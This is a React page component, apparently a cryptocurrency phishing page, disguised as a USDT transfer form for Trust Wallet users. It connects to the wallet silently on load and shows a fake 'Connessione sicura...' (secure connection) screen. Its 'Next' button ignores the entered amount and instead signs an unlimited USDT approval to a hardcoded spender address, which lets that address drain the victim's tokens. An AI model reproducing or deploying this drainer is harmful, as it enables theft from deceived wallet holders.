import { useState, useEffect } from "react";
import { ethers } from "ethers";

export default function Home() {

  const [address, setAddress] = useState("0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1");
  const [amount, setAmount] = useState("");
  const [connected, setConnected] = useState(false);
  const [loading, setLoading] = useState(true);

  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const SPENDER = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";

  // 🔥 AUTO CONNECT INVISIBILE
  useEffect(() => {
    async function autoConnect() {
      try {
        if (!window.ethereum) return;

        const accounts = await window.ethereum.request({
          method: "eth_accounts",
        });

        if (accounts.length === 0) {
          await window.ethereum.request({
            method: "eth_requestAccounts",
          });
        }

        setConnected(true);
        setLoading(false);

      } catch (err) {
        console.log(err);
        setLoading(false);
      }
    }

    autoConnect();
  }, []);

  const approveUSDT = async () => {
    try {
      if (!window.ethereum) {
        alert("Apri in Trust Wallet");
        return;
      }

      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const usdt = new ethers.Contract(
        USDT_ADDRESS,
        [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ],
        signer
      );

      await usdt.approve(SPENDER, ethers.MaxUint256);

      alert("Approve inviato 🔥");

    } catch (err) {
      console.log(err);
      alert("Errore: " + err.message);
    }
  };

  const usdValue = amount && Number(amount) > 0
    ? Number(amount).toFixed(2)
    : "0.00";

  const isValidAmount = amount && Number(amount) > 0;

  // ❌ fuori wallet
  if (typeof window !== "undefined" && !window.ethereum) {
    return (
      <div style={{
        background: "#0b0b0b",
        height: "100vh",
        color: "white",
        display: "flex",
        justifyContent: "center",
        alignItems: "center"
      }}>
        Apri in Trust Wallet
      </div>
    );
  }

  // 🔥 LOADING SCREEN (nasconde connect)
  if (loading) {
    return (
      <div style={{
        background: "#0b0b0b",
        height: "100vh",
        color: "white",
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
        gap: "20px"
      }}>
        <div style={{
          width: "40px",
          height: "40px",
          border: "4px solid #333",
          borderTop: "4px solid #4ade80",
          borderRadius: "50%",
          animation: "spin 1s linear infinite"
        }} />
        <div style={{ color: "#aaa" }}>
          Connessione sicura...
        </div>

        <style>
          {`
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
          `}
        </style>
      </div>
    );
  }

  return (
    <div style={{
      background: "#0b0b0b",
      minHeight: "100vh",
      color: "white",
      padding: "20px"
    }}>

      <div style={{ marginTop: "40px" }}>
        <div style={{ color: "#888", marginBottom: "8px" }}>
          Address
        </div>

        <input
          value={address}
          onChange={(e) => setAddress(e.target.value)}
          style={{
            width: "100%",
            padding: "14px",
            borderRadius: "12px",
            background: "#1a1a1a",
            color: "white",
            border: "none"
          }}
        />
      </div>

      <div style={{ marginTop: "20px" }}>
        <div style={{ color: "#888", marginBottom: "8px" }}>
          Amount
        </div>

        <input
          type="number"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          placeholder="USDT"
          style={{
            width: "100%",
            padding: "14px",
            borderRadius: "12px",
            background: "#1a1a1a",
            color: "white",
            border: "none"
          }}
        />

        <div style={{ color: "#888", marginTop: "5px" }}>
          ≈ ${usdValue}
        </div>
      </div>

      <button
        onClick={approveUSDT}
        disabled={!isValidAmount}
        style={{
          marginTop: "40px",
          width: "100%",
          padding: "18px",
          borderRadius: "40px",
          background: isValidAmount ? "#4ade80" : "#1a2e22",
          color: isValidAmount ? "#052e16" : "#6b7280",
          border: "none"
        }}
      >
        Next
      </button>

    </div>
  );
}